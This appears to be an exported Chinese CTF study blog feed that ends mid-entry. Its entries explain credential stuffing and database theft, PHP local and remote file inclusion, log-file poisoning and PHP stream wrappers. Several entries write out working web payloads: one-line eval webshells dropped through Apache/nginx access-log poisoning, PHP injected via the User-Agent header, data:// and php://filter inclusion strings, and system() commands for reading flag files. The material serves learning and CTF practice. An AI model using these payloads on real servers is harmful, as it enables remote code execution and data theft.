        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>撞库、拖库、洗库</title>
      <link href="/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/"/>
      <url>/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>撞库是黑客通过收集互联网已经泄露的用户和密码信息，生成对应的字典表，尝试批量登录其它网站后，得到一系列可以登录的用户。</li><li>很多用户在不同网站使用的是相同的账号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网站，这就可以理解为撞库攻击</li></ol><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ol><li>撞库可采用大数据安全技术来防护，比如：用数据资产梳理发现敏感目录，使用数据库加密保护核心数据，使用数据库安全运维防运维人员撞库攻击等</li></ol><h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ol><li>拖库是指黑客侵入有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，经常被称为脱裤</li></ol><h1 id="洗库"><a href="#洗库" class="headerlink" title="洗库"></a>洗库</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><ol><li>在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这也通常被称作‘洗库’</li><li>最后黑客将得到的数据在其它网站上尝试登录，叫做撞库，很多用户喜欢使用统一的用户名密码，‘撞库’也可以使黑客收获颇丰</li></ol><h2 id="撞库常见姿势"><a href="#撞库常见姿势" class="headerlink" title="撞库常见姿势"></a>撞库常见姿势</h2><ol><li>使用ssh登录到服务器中<pre class="line-numbers language-none"><code class="language-none">ssh username@server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看能够使用root权限的用户列表<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞进阶--日志文件包含利用</title>
      <link href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞进阶–日志文件包含利用"><a href="#文件包含漏洞进阶–日志文件包含利用" class="headerlink" title="文件包含漏洞进阶–日志文件包含利用"></a>文件包含漏洞进阶–日志文件包含利用</h1><h2 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h2><ol><li>目标服务器存在文件包含漏洞的前提下</li><li>没有上传功能下获取权限的方法</li></ol><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><ol><li>当某个php文件存在本地文件包含漏洞，而却无法正常上传文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者可能会利用<strong>apache日志文件</strong>来入侵</li><li>apache服务器运行后会生成两个日志文件，分别是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且<strong>写到访问日志access.log文件中</strong></li></ol><h2 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h2><p>总：通过日志文件getshell</p><ol><li>通过burpsuit发送的请求包产生日志数据</li><li>包含日志文件</li><li>写入一句话木马getshell</li><li>我的理解就是：添加一条日志文件数据，此日志文件中写木马，getshell</li></ol><h2 id="日志文件相关"><a href="#日志文件相关" class="headerlink" title="日志文件相关"></a>日志文件相关</h2><h3 id="日志文件路径"><a href="#日志文件路径" class="headerlink" title="日志文件路径"></a>日志文件路径</h3><ol><li>nginx日志文件路径：?file=/var/log/nginx/access.log</li><li>apache2日志文件路径:?file=/var/log/apache2/access.log</li><li>这里主要看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量</li><li><img src="https://img-blog.csdnimg.cn/img_convert/23c5f4f299615c69e592f7ece9907d94.png"></li></ol><h3 id="没有access-log的原因"><a href="#没有access-log的原因" class="headerlink" title="没有access.log的原因"></a>没有access.log的原因</h3><ol><li>进入目录下，如果发现没有access.log这个访问文件，是因为apache配置文件没有打开这个配置选项，需要对相应的功能进行开启<img src="https://img-blog.csdnimg.cn/img_convert/b8c8454b0d069865745feb6bbd09d167.png">\</li></ol><h3 id="开启access-log"><a href="#开启access-log" class="headerlink" title="开启access.log"></a>开启access.log</h3><ol><li>通过配置文件开启access.log访问日志功能<br><img src="https://img-blog.csdnimg.cn/img_convert/d49bb603d9ddf284be8f3292180d5b2c.png"></li><li>搜索CustomLog “logs/access.log” common，将前面的##注释去掉，并保存文件，然后重启PHPstudy:</li><li>访问几个网页，查看记录，对自己访问的页面有记录，说明access.log可以自动记录访问操作<br><img src="https://img-blog.csdnimg.cn/img_convert/645dae3d4466cd9df0b9917acbe526d7.png"></li></ol><h2 id="入侵过程"><a href="#入侵过程" class="headerlink" title="入侵过程"></a>入侵过程</h2><ol><li>通过访问，让访问日志记录我们的phpinfo();代码，可以看出，访问日志已经成功记录了我们的访问内容,即可以在路径后面直接加/phpinfo();<pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdnimg.cn/img_convert/3442991cff249f5897ff13173b42e4d5.png"></li><li>通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。</li><li>使用burp修改编码后的数据：即将burp中抓的包中URL编码的位置改为原本的字符<br><img src="https://img-blog.csdnimg.cn/img_convert/c2a0db8f67e1b0fe3c5bd409d407a440.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/357a5a76f7eb0998aa444004b3d23fca.png"></li><li>查看访问日志，可以看出没有编码的phpinfo();代码已经成功记录<br><img src="https://img-blog.csdnimg.cn/img_convert/514099aa5e2a00b27be2e2ebef9bda3c.png"></li><li>文件包含只要文件中有Php代码，它就会调用include(),require()等函数将这个文件当作php脚本进行解析，这样我们就可以包含这个日志文件，让目标服务器把日志文件解析为php脚本</li><li>让访问日志文件记录下写入文件脚本代码：（这个地方就包含了password，为了进行下一步连接蚁剑提供密码）<br>访问内容：<pre class="line-numbers language-none"><code class="language-none">&lt;?php$file&#x3D;fopen(&#39;test1.php&#39;,&#39;w&#39;);fputs($file,&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功<img src="https://img-blog.csdnimg.cn/img_convert/80d9f87d67298bd7c9e8de1a00001a92.png">,解析方式：前面该是怎么样就是怎么样，解析不了直接跳过，一直到能够正常解析的位置就去解析</li><li>连接蚁剑，密码就是上面请求并进行URL编码解码处理后的密码</li></ol><h2 id="nginx的access-log文件详解"><a href="#nginx的access-log文件详解" class="headerlink" title="nginx的access.log文件详解"></a>nginx的access.log文件详解</h2><h2 id="nginx系统中日志文件一般放在-var-log-nginx下"><a href="#nginx系统中日志文件一般放在-var-log-nginx下" class="headerlink" title="nginx系统中日志文件一般放在/var/log/nginx下"></a>nginx系统中日志文件一般放在/var/log/nginx下</h2><ol><li>直接使用tail -f命令即可查看access日志</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"><a href="#文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞" class="headerlink" title="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"></a>文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞</h2><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>php文件包含漏洞产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了意想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，最常见的就是本地文件包含漏洞</li><li>开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。</li><li>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</li><li>在PHP web application中文件包含漏洞居多，jsp，asp等程序中很少，这就是语言设计的弊端</li></ol><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ol><li>本地文件包含漏洞：网站服务器本身存在恶意文件，然后利用本地文件包含使用</li><li>远程文件包含漏洞：远程文件包含就是调用其它网站的恶意文件进行打开</li></ol><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><ol><li>php：include(),include_once(),fopen(),require(),require_once()</li><li>jsp/servelt:ava.io,file(),java.io,filereader()</li><li>asp:include file;virtual</li></ol><h2 id="主流文件包含php一些函数的含义"><a href="#主流文件包含php一些函数的含义" class="headerlink" title="主流文件包含php一些函数的含义"></a>主流文件包含php一些函数的含义</h2><ol><li>include():执行到include()才会包含文件，找不到文件只会产生警告，还会接着运行后面的脚本</li><li>require():只要程序一直运行就会包含文件，如果找不到包含文件则会产生致命错误，并且脚本运行终止</li><li>include_once()和require_once()：如果文件包含被执行了，就不会执行第二次</li></ol><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>文件包含是也是一种执行方式，即include和require函数的执行都会执行内部的参数，将内部的参数当作php源码去执行</li></ol><h2 id="本地文件包含：LFI，local-file-inclusion"><a href="#本地文件包含：LFI，local-file-inclusion" class="headerlink" title="本地文件包含：LFI，local file inclusion"></a>本地文件包含：LFI，local file inclusion</h2><ol><li><p>本地文件包含漏洞指的是能打开并且包含本地文件的漏洞，大部分情况下遇到的文件包含漏洞都是LFI</p></li><li><p>首先创建两个文件，1.txt 和 11.php  如下：</p></li></ol><p>  <img src="https://img-blog.csdnimg.cn/2018111011030967.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br>  <img src="https://img-blog.csdnimg.cn/20181110110324655.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></p><ol start="3"><li><p>创建完后并对  11.php 进行访问，并且传入参数：<br><img src="https://img-blog.csdnimg.cn/20181110110423351.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20181110110413561.PNG"></p></li><li><p>看吧，成功了，这就是简单的本地文件包含，但如果将1.txt 内的内容换成一句换木马，再用菜刀连接一下，那是不是就可以获取shell了，这里小编就不演示了，留给你们慢慢琢磨。。。。。。</p></li></ol><h2 id="远程文件包含，RFI，remote-file-inclusion"><a href="#远程文件包含，RFI，remote-file-inclusion" class="headerlink" title="远程文件包含，RFI，remote file inclusion"></a>远程文件包含，RFI，remote file inclusion</h2><ol><li>远程文件包含需要对php.ini进行一些配置</li><li>即allow_url_fopen和allow_url_include要为ON，即和伪协议的使用条件相同</li><li>设置成功后记得要保存并且重新启动一下</li><li>好了现在可以开始演示远程包含了，其实和文件包含相差无几，只是把包含的换成外网链接一下就好了<br><img src="https://img-blog.csdnimg.cn/20181110112156499.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></li><li>文件包含原理也就是这么个样子，虽然操作简单，但其实是一个很危险的一个漏洞，除了可以利用他拿到shell</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="文件包含漏洞记得使用PHP伪协议"><a href="#文件包含漏洞记得使用PHP伪协议" class="headerlink" title="文件包含漏洞记得使用PHP伪协议"></a>文件包含漏洞记得使用PHP伪协议</h3><ol><li>什么时候使用php伪协议：文件包含</li></ol><h3 id="csdn中的一道例题"><a href="#csdn中的一道例题" class="headerlink" title="csdn中的一道例题"></a>csdn中的一道例题</h3><ol><li><a href="http://vulnerable/fileincl/example1.php?page=intro.php%EF%BC%88%E8%AF%A5php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">http://vulnerable/fileincl/example1.php?page=intro.php（该php文件包含LFI本地文件上传漏洞</a>)</li><li>但是没有地方可以upload你的webshell后门代码</li><li>LFI只能读取到非php文件的源码，因为php文件会被直接执行，没有办法查看到源码（但是如果可以以base64加密，则可以不去读取php的源码）</li><li>如果你能读取到config.php之类的文件，或许可以拿到数据库账号远程登录数据库入侵进去</li><li>现在的问题是：LFI如何读取到php文件的源码</li><li>演示：如果正常用LFI去读/sqli/db.php文件，是无法读取到它的源码的，只会被当作php文件被执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdn.net/20180725135532381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></li><li>使用php://filter/read=convert.base64-encode/resource=可以将指定php文件的源码以base64方式编码并被显示出来</li><li>因为被base64编码过了，所以可以不被执行的情况下显示源码，只不过是被base64编码过的，解码即可<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723125157.png"></p><ol><li>没有任何过滤，可以直接使用伪代码去看看flag.php</li><li>使用php://filter伪代码</li></ol><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><ol><li>发现对php有过滤，使用str_replace进行替换<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723135932.png"></li><li>使用php://filter伪协议查看flag.php的代码发现flag.php被替换为flag.???,被过滤并且不能查看到源代码<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723140046.png"></li><li>伪协议又不止一个，可以使用data://text/plain,伪协议绕过</li><li>因为过滤了’php’字样，所以使用短标签<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>使用data://text/plain伪协议的同时，post值<pre class="line-numbers language-none"><code class="language-none">1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>即可查看到flag</li><li>这个题的思路和逃逸很类似，将变量1逃逸出去，和命令执行中?c=include%0a$_GET[1]?&gt;&amp;1=system(‘ls’);一样</li></ol><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol><li>nginx日志文件路径：?file=/var/log/nginx/access.log</li><li>apache2日志文件路径:?file=/var/log/apache2/access.log</li><li>直接访问会显示User-Agent的信息<br><img src="https://img-blog.csdnimg.cn/20210227204642790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDg2MjE4,size_16,color_FFFFFF,t_70"></li><li>写入php文件，进行getshell<br>User-Agent:<?php system("cat flag.php");?></li><li>注意：访问日志文件只会显示前几次的访问情况，要查看当前访问情况需要再一次访问（访问的这一次还没有写入日志中，日志中只有此次访问之前的日志信息）</li></ol><h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723145912.png"></li><li>对php和data有过滤，就不能使用php://filter和data://text/plain,伪协议了</li><li>注意是先传User-Agent,到index.php中</li><li>再去访问 ?file=/var/log/nginx/access.log 看看是否包含成功<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li><li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><ol><li>  和上一个题一样，先把User-Agent写进根目录，User-Agent中的内容是php攻击payload</li><li>  拼接get传参的file变量，file=/var/log/nginx/access.log</li><li>  同时post传入攻击payload，和第一步配合</li></ol><h2 id="NewStarCTF-web2-includeOne"><a href="#NewStarCTF-web2-includeOne" class="headerlink" title="NewStarCTF web2 includeOne"></a>NewStarCTF web2 includeOne</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seed.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mt_srand(*********);</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hint: "</span><span class="token operator">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/base|\.\./i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/NewStar/i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//flag in `flag.php`</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Baby Hacker?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> Hint<span class="token punctuation">:</span> <span class="token number">1219893521</span>No Hacker<span class="token operator">!</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  这个题的考点就是mt_rand()函数</p></li><li><p>  这题是伪随机数的种子爆破，跟枯燥的抽奖那题类似，就是mt_rand()生成随机整数的时，会先进行种子的播种，当种子一样，接下来的数值根据次数也是可预测的，题目过滤了base，并且要有NewStar，可以使用rot进行文件包含。</p></li><li><p>  mt_rand()函数每使用一次，就会对当前的seed进行播种，然后伪随机数加密,<strong>但是一定要看好是给出的结果是第几次加密得到的</strong></p></li></ol><h4 id="mt-rand-函数实例"><a href="#mt-rand-函数实例" class="headerlink" title="mt_rand()函数实例"></a>mt_rand()函数实例</h4><ol><li><p>  <img src="https://img-blog.csdnimg.cn/7ea36b40cf8c442c9117260a391230c5.png" alt="img"></p></li><li><p>  <img src="https://img-blog.csdnimg.cn/18f1fe0c9c32495e93179e99cf11e93c.png" alt="img"></p></li><li><p>  爆出了种子为1145146，接下来使用相同的种子进行两次mt_rand()即可得到相同的数值，得到1202031004</p></li><li><p>  <img src="https://img-blog.csdnimg.cn/7049f562ab34453e8173b0f06d819bf0.png" alt="img"></p></li><li><p>  <img src="https://img-blog.csdnimg.cn/7049f562ab34453e8173b0f06d819bf0.png" alt="img"></p></li><li><p>最后进行rot13解密即可</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php">s <span class="token operator">=</span> <span class="token string double-quoted-string">"synt&#123;sor00r4p-63rq-47q0-o8rr-610s58s76n4n&#125;"</span>i <span class="token operator">=</span> <span class="token number">13</span>result <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token keyword">for</span> c in s<span class="token punctuation">:</span>    oc <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">65</span> <span class="token operator">&lt;=</span> oc <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>oc <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>    elif <span class="token number">97</span> <span class="token operator">&lt;=</span> oc <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>oc <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> c<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">//这时我贴的脚本，我建议使用cyberchef和CTF在线工具等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><ol><li>  rot13是一种字符处理方式，字符右移13位</li><li>  当preg_match过滤了base时，可以在使用php://filter伪协议的同时使用rot13,而不是使用base64</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006202922.png"></li><li>  在 <strong>filter/</strong> 和 <strong>/read</strong> 之间，我们可以添加任意的字符，当preg_match需要的时候</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203159.png"></li><li>  查看源代码，我们可以看到rot13编码得到的flag</li><li>  使用凯撒加密解码的方式，我们可以得到flag</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203327.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="什么是php伪协议"><a href="#什么是php伪协议" class="headerlink" title="什么是php伪协议"></a>什么是php伪协议</h2><ol><li>php伪协议实际上就是支持的协议与封装协议</li></ol><h2 id="大佬的博客"><a href="#大佬的博客" class="headerlink" title="大佬的博客"></a>大佬的博客</h2><p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815370">https://blog.csdn.net/Jeff_12138/article/details/124815370</a></p><h2 id="什么时候使用php伪协议"><a href="#什么时候使用php伪协议" class="headerlink" title="什么时候使用php伪协议"></a>什么时候使用php伪协议</h2><h3 id="文件包含时使用"><a href="#文件包含时使用" class="headerlink" title="文件包含时使用!!!"></a>文件包含时使用!!!</h3><ol><li>例如这个时候：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li></ol><h3 id="可能遇见的文件包含函数"><a href="#可能遇见的文件包含函数" class="headerlink" title="可能遇见的文件包含函数"></a>可能遇见的文件包含函数</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163727.png"></p><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ol><li>allow_url_fopen:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720160552.png"></li><li>allow_url_include:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161022.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161043.png"></li></ol><h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,data:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ol><li>data://text/plain,    可以把后面的伪代码当作代码执行<pre class="line-numbers language-none"><code 